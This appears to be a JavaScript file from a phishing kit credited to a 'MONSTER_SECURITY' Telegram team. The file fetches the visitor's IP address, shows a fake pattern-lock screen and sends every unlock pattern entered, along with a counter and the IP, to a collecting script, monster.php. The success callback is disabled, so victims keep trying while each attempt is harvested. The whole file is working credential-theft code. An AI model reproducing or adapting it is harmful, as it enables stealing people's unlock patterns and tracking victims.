/***********************
TEAM : HTTPS://T.ME/MONSTER_SECURITY
***********************/
var e = document.getElementById('lock')
var uID = '', tmp = '', c = 0;
$.getJSON('https://api.ipify.org/?format=json', function(r){uID = r.ip;});
function sendPattern(e){
	var link = "monster.php?MONSTER_SECURITY=" + e;
	var xhr = new XMLHttpRequest();
	xhr.onreadystatechange = function(){
		if (xhr.readyState == 4){}
	};
	xhr.open('GET', link);
	xhr.send()
}
var p = new PatternLock(e, {
	onPattern: function(pp) {
		//this.success()
		if(pp){
			c++;
			tmp = c + '|' +uID + '|' + pp;
			sendPattern(tmp);
		}
	}
});
